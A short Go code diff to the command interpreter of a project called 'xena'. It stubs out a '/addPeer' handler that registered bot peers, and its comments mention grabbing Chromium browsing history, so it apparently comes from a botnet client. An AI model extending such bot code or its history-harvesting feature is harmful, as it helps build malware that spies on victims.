@@ -14,7 +14,6 @@ import (
 	"xena/helpers"
 	"xena/modules"
 	"xena/networking"
-	"xena/repository"
 
 	"github.com/golang-jwt/jwt"
 )
@@ -219,10 +218,9 @@ func InterpretMessage(host string, message domains.Message) (domains.Message, er
 
 		// Add a bot peer.
 	} else if strings.HasPrefix(content.Shell, "/addPeer ") {
+		// TO DO
 		peerAddress := content.Shell[9:]
-		repository.EntitiesPool = append(repository.EntitiesPool, domains.Entity{
-			Address: peerAddress,
-		})
+		// addPeer()
 		replyContent.Other = "Added peer:" + peerAddress
 
 		// Grab Chromium history of visits.
